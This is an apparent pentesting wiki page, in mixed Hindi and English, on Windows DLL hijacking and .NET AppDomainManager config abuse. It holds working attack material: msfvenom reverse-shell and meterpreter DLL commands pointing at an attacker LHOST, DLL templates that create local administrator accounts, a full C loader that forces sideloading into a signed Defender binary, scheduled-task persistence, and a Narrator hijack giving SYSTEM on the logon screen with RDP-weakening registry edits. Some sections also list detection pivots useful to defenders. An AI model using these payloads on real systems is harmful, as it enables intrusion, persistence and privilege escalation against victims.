# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking में एक trusted application को manipulate करके एक malicious DLL लोड कराई जाती है। यह term **DLL Spoofing, Injection, और Side-Loading** जैसी कई tactics को शामिल करती है। इसका मुख्य उपयोग code execution, persistence हासिल करने, और कम मामलों में privilege escalation के लिए होता है। हालाँकि यहाँ escalation पर focus है, hijacking की method उद्देश्यों के बीच consistent रहती है।

### Common Techniques

DLL hijacking के लिए कई methods इस्तेमाल होती हैं, और हर method की effectiveness application की DLL loading strategy पर निर्भर करती है:

1. **DLL Replacement**: एक genuine DLL को malicious DLL से बदलना, और चाहें तो original DLL की functionality बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: malicious DLL को search path में legitimate DLL से पहले रखना, और application के search pattern का फायदा उठाना।
3. **Phantom DLL Hijacking**: application के लिए एक malicious DLL बनाना ताकि वह उसे load करे, यह सोचकर कि वह required DLL मौजूद नहीं है।
4. **DLL Redirection**: `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters को modify करके application को malicious DLL की ओर redirect करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को malicious counterpart से बदलना, यह method अक्सर DLL side-loading से जुड़ी होती है।
6. **Relative Path DLL Hijacking**: malicious DLL को user-controlled directory में copied application के साथ रखना, जो Binary Proxy Execution techniques जैसा दिखता है।


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading ही trusted **.NET Framework** process को attacker code load कराने का एकमात्र तरीका नहीं है। अगर target executable एक **managed** application है, तो CLR executable के नाम वाली एक **application configuration file** भी देखता है (उदाहरण के लिए `Setup.exe.config`)। वह file एक custom **AppDomainManager** define कर सकती है। अगर config किसी attacker-controlled assembly की ओर point करती है जो EXE के साथ रखी गई हो, तो CLR उसे application के normal code path से **पहले** load करता है और trusted process के अंदर run करता है।

Microsoft की .NET Framework configuration schema के अनुसार, custom manager इस्तेमाल करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों present होने चाहिए।

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
न्यूनतम प्रबंधक:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
व्यावहारिक नोट्स:
- यह **.NET Framework specific** tradecraft है। यह CLR config parsing पर निर्भर करता है, Win32 DLL search order पर नहीं।
- host वास्तव में एक **managed EXE** होना चाहिए। जल्दी triage: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- config filename executable नाम से बिल्कुल match होना चाहिए (`<binary>.config`) और आमतौर पर **EXE के पास** रहता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है क्योंकि trusted EXE अपरिवर्तित रहता है जबकि malicious managed assembly in-process execute होती है।
- अगर आपके पास पहले से writable installer/update directory है, तो AppDomainManager hijacking को **first stage** के रूप में इस्तेमाल किया जा सकता है, जिसके बाद later stages के लिए classic DLL sideloading या reflective loading किया जा सकता है।

### AppDomainManager as a downloader + scheduled-task bootstrap

एक practical intrusion pattern trusted managed EXE को एक malicious `*.config` और एक malicious AppDomainManager DLL के साथ pair करना है, जो सिर्फ एक **small bootstrapper** के रूप में काम करता है:

1. User एक signed .NET installer या updater को `%USERPROFILE%\Downloads` जैसी believable location से launch करता है।
2. पास वाली config CLR को attacker assembly **legitimate app logic शुरू होने से पहले** load करने देती है।
3. malicious manager एक **path gate** करता है (उदाहरण के लिए, केवल तभी आगे बढ़े जब host EXE `Downloads` से run हो रहा हो, और second stage को केवल `%LOCALAPPDATA%` से चलने दे)।
4. अगर check pass हो जाता है, तो यह real payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसी user-writable path में download करता है और scheduled task के साथ persistence install करता है।

यह variant क्यों महत्वपूर्ण है:
- signed host EXE unchanged रहता है, इसलिए जो triage केवल main binary को hash करता है, वह compromise को miss कर सकता है।
- simple **path-based anti-analysis** common है: ZIP/EXE/DLL triad को Desktop, Temp, या sandbox path में move करने से chain intentionally टूट सकती है।
- first-stage AppDomainManager DLL छोटा और low-noise रह सकता है जबकि real implant बाद में fetch किया जाता है।

इस pattern में अक्सर दिखने वाला minimal persistence example:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` का मतलब उस user/session के लिए **highest available** है; यह अपने-आप में guaranteed SYSTEM escalation नहीं है।
- यह technique अक्सर classic missing-DLL search-order hijacking की बजाय **execution/persistence via .NET config abuse** के रूप में बेहतर categorized होती है, हालांकि operators अक्सर दोनों को साथ chain करते हैं।

Detection pivots:
- Signed .NET executables जो **ZIP extraction paths**, `Downloads`, `%TEMP%`, या अन्य user-writable folders से launch हों, और जिनके साथ **colocated** `<exe>.config` हो।
- नए scheduled tasks जिनकी action `%LOCALAPPDATA%`, `%APPDATA%`, या `Downloads` की ओर point करे और जिनके नाम browser/vendor updaters की नकल करें।
- Short-lived managed bootstrap processes जो तुरंत दूसरा EXE download करें, फिर `schtasks.exe` spawn करें।
- Samples जो early exit कर दें जब तक executable path expected user-profile directory से match न करे।

### Hijacking an existing scheduled task to relaunch the sideload chain

Persistence के लिए, सिर्फ **creating a new task** पर न देखें। कुछ intrusion sets तब तक wait करते हैं जब तक कोई legitimate installer एक **normal updater task** create न कर दे, और फिर **task action rewrite** कर देते हैं ताकि existing name, author, और trigger defenders को familiar लगें।

Reusable workflow:
1. Legitimate software install/run करें और वह task identify करें जो वह normally बनाता है।
2. Task XML export करें और current `<Exec><Command>` / `<Arguments>` values note करें।
3. सिर्फ action replace करें ताकि task आपका **trusted host EXE** एक user-writable staging directory से start करे, जो फिर real payload को side-load या AppDomain-load करे।
4. नया obvious persistence artifact बनाने के बजाय same task name re-register करें।
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- The task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls खोजना

System के अंदर missing Dlls खोजने का सबसे common तरीका [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) को sysinternals से चलाना है, और **following 2 filters** **set** करना है:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

और सिर्फ **File System Activity** दिखाएँ:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

अगर आप **missing dlls in general** खोज रहे हैं, तो इसे कुछ **seconds** तक चलने दें.\
अगर आप किसी **specific executable** के अंदर एक **missing dll** खोज रहे हैं, तो आपको **"Process Name" "contains" `<exec name>`** जैसा एक और filter set करना चाहिए, उसे execute करें, और capturing events रोक दें.

## Exploiting Missing Dlls

Privileges escalate करने के लिए, हमारे पास सबसे अच्छा chance यह है कि हम एक **dll लिख सकें जिसे कोई privilege process load करने की कोशिश करेगा** किसी ऐसे **place** में जहाँ उसे search किया जाएगा. इसलिए, हम एक **folder** में एक dll **write** कर पाएँगे जहाँ **dll पहले** search होती है उस folder से जहाँ **original dll** है (weird case), या हम ऐसे किसी folder पर **write** कर पाएँगे जहाँ dll search होने वाली है और original **dll** किसी भी folder में मौजूद नहीं है।

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** DLLs को एक set of **pre-defined search paths** के अनुसार ढूँढती हैं, और एक particular sequence follow करती हैं। DLL hijacking की problem तब आती है जब एक harmful DLL इनमें से किसी directory में strategically place की जाती है, ताकि वह authentic DLL से पहले load हो जाए। इसे prevent करने का solution यह है कि application जिन DLLs की जरूरत है, उनके लिए absolute paths use करे।

आप नीचे **32-bit** systems पर **DLL search order** देख सकते हैं:

1. वह directory जहाँ से application load हुई।
2. system directory. इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function use करें.(_C:\Windows\System32_)
3. 16-bit system directory. इस directory का path पाने के लिए कोई function नहीं है, लेकिन इसे search किया जाता है. (_C:\Windows\System_)
4. Windows directory. इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function use करें.
1. (_C:\Windows_)
5. current directory.
6. PATH environment variable में listed directories. ध्यान दें कि इसमें **App Paths** registry key द्वारा specified per-application path शामिल नहीं है. DLL search path compute करते समय **App Paths** key use नहीं होती।

यह **default** search order है जब **SafeDllSearchMode** enabled हो। जब यह disabled होता है, तो current directory second place पर आ जाती है। इस feature को disable करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value create करें और इसे 0 set करें (default enabled है)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

आखिर में, ध्यान दें कि **एक dll को सिर्फ नाम की बजाय absolute path देकर भी load किया जा सकता है**। उस case में वह dll **सिर्फ उसी path** में search होगी (अगर dll की कोई dependencies हों, तो वे भी जैसे नाम से load हुई हों वैसे search होंगी)।

Search order बदलने के और भी तरीके हैं, लेकिन मैं यहाँ उन्हें explain नहीं करूँगा।

### Arbitrary file write को missing-DLL hijack में chain करना

1. **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) use करें ताकि उन DLL names को collect किया जा सके जिन्हें process probe करता है लेकिन ढूँढ नहीं पाता।
2. अगर binary एक **schedule/service** पर run होती है, तो उन names में से किसी एक वाली DLL को **application directory** (search-order entry #1) में drop करने पर वह next execution पर load हो जाएगी। एक .NET scanner case में process `hostfxr.dll` को `C:\samples\app\` में ढूँढ रहा था, इससे पहले कि वह `C:\Program Files\dotnet\fxr\...` से real copy load करे।
3. किसी भी export के साथ payload DLL बनाइए (e.g. reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. अगर आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसा ZIP craft करें जिसकी entry extraction dir से बाहर निकले ताकि DLL app folder में land हो:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. आर्काइव को watched inbox/share में डिलीवर करें; जब scheduled task process को फिर से launch करता है, तो यह malicious DLL लोड करता है और आपकी code को service account के रूप में execute करता है।

### RTL_USER_PROCESS_PARAMETERS.DllPath के जरिए sideloading को मजबूर करना

नई बनाई गई process के DLL search path को deterministically influence करने का एक advanced तरीका है process बनाते समय ntdll के native APIs का उपयोग करके RTL_USER_PROCESS_PARAMETERS में DllPath field सेट करना। यहां attacker-controlled directory देकर, ऐसा target process जो name से imported DLL resolve करता है (कोई absolute path नहीं और safe loading flags का उपयोग नहीं करता) उस directory से malicious DLL load करने के लिए मजबूर किया जा सकता है।

Key idea
- RtlCreateProcessParametersEx के साथ process parameters build करें और एक custom DllPath दें जो आपके controlled folder की ओर point करे (जैसे वह directory जहां आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ process create करें। जब target binary name से किसी DLL को resolve करता है, loader resolution के दौरान इस supplied DllPath को consult करेगा, जिससे reliable sideloading संभव हो जाता है, भले ही malicious DLL target EXE के साथ colocated न हो।

Notes/limitations
- यह बनाए जा रहे child process को affect करता है; यह SetDllDirectory से अलग है, जो केवल current process को affect करता है।
- Target को name से DLL import या LoadLibrary करना चाहिए (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं)।
- KnownDLLs और hardcoded absolute paths hijack नहीं किए जा सकते। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath के जरिए DLL sideloading को मजबूर करना</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- DllPath directory में एक malicious xmllite.dll रखें (ज़रूरी functions export करके या real one को proxy करके)।
- ऊपर वाली technique का उपयोग करके एक signed binary लॉन्च करें जो नाम से xmllite.dll lookup करने के लिए जाना जाता है। loader, दिए गए DllPath के जरिए import resolve करता है और आपकी DLL sideload करता है।

यह technique in-the-wild में multi-stage sideloading chains चलाने के लिए देखी गई है: एक initial launcher एक helper DLL drop करता है, जो फिर Microsoft-signed, hijackable binary को custom DllPath के साथ spawn करता है ताकि attacker की DLL को staging directory से load किया जा सके।


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** targets के लिए, sideloading को **Main() से पहले** memory patching के बिना किया जा सकता है, application की adjacent **`.exe.config`** file का abuse करके। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker legitimate .NET EXE के साथ एक malicious config और एक या अधिक attacker-controlled assemblies रखता है।

Chain कैसे काम करती है:
1. Host EXE start होता है और **CLR `<exe>.config`** पढ़ता है।
2. Config **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** set करता है ताकि runtime एक attacker-controlled `AppDomainManager` instantiate करे।
3. Malicious manager trusted host process के अंदर **pre-`Main()` execution** पाता है।
4. Same config CLR को local assemblies पहले resolve करने के लिए force कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमजोर कर सकता है।

Campaign-style pattern (exact nesting directive / CLR version के हिसाब से vary कर सकती है):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** assembly resolution को application directory में रखता है, जिससे folder एक predictable sideloading surface बन जाता है।
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान execution को attacker code में ले जाते हैं, legitimate app logic चलने से पहले।
- **`<bypassTrustedAppStrongNames enabled="true"/>`** एक full-trust app को unsigned या tampered assemblies load करने दे सकता है, बिना strong-name validation failure के।
- **`<publisherPolicy apply="no"/>`** publisher-policy redirects को newer assemblies पर जाने से रोकता है।
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक deterministic बनाता है।
- **`<etwEnable enabled="false"/>`** खास तौर पर interesting है क्योंकि **CLR अपनी own ETW visibility को configuration से disable करता है** instead of implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 `setup.exe`, `setup.exe.config`, और local assemblies drop करता है।
- Stage 2 उन्हें believable **AppData update** folder में copy करता है, host का नाम `update.exe` जैसा कुछ रखता है, और उसे **scheduled task** के जरिए relaunch करता है।
- Stage 3 execution context verify करता है (for example Task Scheduler से expected parent `svchost.exe`) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** suspicious adjacent **`.config`** files के साथ user-writable locations में चल रहे हों।
- `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** हो।
- Scheduled tasks जो renamed update binaries को **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से relaunch करते हों।
- Parent/child chains जहाँ scheduled task एक trusted .NET host launch करता है जो तुरंत अपने own directory से non-vendor assemblies load करता है।

#### Exceptions on dll search order from Windows docs

Windows documentation में standard DLL search order के कुछ exceptions बताए गए हैं:

- जब एक **DLL जो memory में already loaded किसी DLL के नाम से मेल खाती है** मिलती है, तो system usual search bypass कर देता है। इसके बजाय, defaulting to the DLL already in memory से पहले redirection और manifest की check करता है। **इस scenario में, system DLL के लिए search नहीं करता**।
- अगर DLL current Windows version के लिए एक **known DLL** के रूप में recognized हो, तो system अपनी known DLL version, और उसके dependent DLLs, का उपयोग करेगा, **search process को छोड़ते हुए**। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इनमें listed known DLLs रखती है।
- अगर किसी **DLL की dependencies** हों, तो इन dependent DLLs की search ऐसे की जाती है जैसे वे सिर्फ उनके **module names** से indicated हों, चाहे initial DLL full path से identified हुई हो या नहीं।

### Escalating Privileges

**Requirements**:

- एक ऐसा process identify करें जो **different privileges** के under operate करता हो या करेगा (horizontal or lateral movement), और जिसमें **DLL missing** हो।
- सुनिश्चित करें कि **write access** किसी भी **directory** में available हो जहाँ **DLL** को **search** किया जाएगा। यह location executable की directory या system path के भीतर कोई directory हो सकती है।

हाँ, requisites ढूँढना complicated है क्योंकि **by default it's kind of weird to find a privileged executable missing a dll** और **system path folder पर write permissions होना और भी weird है** (default रूप से नहीं मिलती)। लेकिन misconfigured environments में यह possible है।\
अगर आप lucky हों और requirements पूरी मिल जाएँ, तो आप [UACME](https://github.com/hfiref0x/UACME) project check कर सकते हैं। भले ही **main goal of the project is bypass UAC** हो, वहाँ आपको Windows version के लिए **Dll hijaking** का कोई **PoC** मिल सकता है जिसे आप use कर सकते हैं (probably बस उस folder का path बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप एक folder में अपनी **permissions check** कर सकते हैं doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी folders की permissions चेक करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप executable के imports और dll के exports को इस तरह भी check कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**मीटरप्रेटर (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक user बनाएं (x86, मुझे x64 version नहीं दिखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### आपका अपना

ध्यान दें कि कई मामलों में आपको जो Dll compile करनी है, उसे **कई functions export** करने होंगे जिन्हें victim process द्वारा load किया जाएगा। अगर ये functions मौजूद नहीं हैं, तो **binary उन्हें load नहीं कर पाएगी** और **exploit fail** हो जाएगा।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL example with user creation</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>थ्रेड एंट्री के साथ वैकल्पिक C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe स्टार्ट पर अभी भी एक predictable, language-specific localization DLL को probe करता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- अगर OneCore path पर एक writable attacker-controlled DLL मौजूद है, तो वह load हो जाती है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी exports की जरूरत नहीं है।

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`.
- Narrator start करें और ऊपर दिए गए path के attempted load को observe करें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
## OPSEC silence
- एक naive hijack UI को speak/highlight करेगा। quiet रहने के लिए, attach करते समय Narrator threads enumerate करें, main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) खोलें और `SuspendThread` करें; अपनी thread में continue करें। full code के लिए PoC देखें।

## Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर वाले के साथ, Narrator शुरू करने पर planted DLL load होता है। secure desktop (logon screen) पर, Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएं; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।

## RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer allow करें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host पर RDP करें, logon screen पर Narrator launch करने के लिए CTRL+WIN+ENTER दबाएं; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।
- RDP session बंद होते ही execution रुक जाती है—promptly inject/migrate करें।

## Bring Your Own Accessibility (BYOA)
